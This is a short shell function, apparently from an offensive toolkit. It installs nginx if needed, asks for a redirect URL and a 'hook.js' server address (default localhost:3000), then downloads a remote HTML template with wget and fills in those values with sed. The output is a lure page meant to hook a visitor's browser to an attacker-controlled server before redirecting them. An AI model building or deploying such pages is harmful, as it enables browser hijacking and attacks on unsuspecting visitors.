gglog "load xss-html gen a xss html"
xss-html(){
  gglog "searching nginx's configi...."
  grep -nr "root" /etc/  | grep nginx | grep www
  if [ $? -ne 0 ];then
    echo -ne "if install nginx: [Enter/other]"
    read if_install_nginx;
    if [[ $if_install_nginx != "" ]];then
        if [ $(test_cmd yum ) -eq 0 ];then
	    yum install -y nginx;
	else
	    apt-get install -y nginx;
	fi
        grep -nr "root" /etc/  | grep nginx | grep www
    fi
  fi
  echo -ne "set jump to url: default www.google.com [Enter/url] $UNDERLINE"
  read gourl;
  if [[ $gourl == "" ]]; then
	  gourl="www.google.com";
  fi
  echo -ne "$REST set hook.js 's ip: default: localhost:3000 [Enter/ip:port]$UNDERLINE"
  read ip;
  if [[ $ip == "" ]]; then
	  ip="localhost:3000";
  fi
  echo -ne  "$REST set jump delay sec default: 3 [0 no jump] [Enter/int] $UNDERLINE"
  read sec;
  if [[ $sec == "" ]]; then
	  sec="3";
  fi
  gglog "to download template and render..."
  wget -q -O- 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/xss-res/_template.html' |  sed "s/{sec}/$sec/g; s/{gourl}/$gourl/g; s/{ip}/$ip/g " -

}
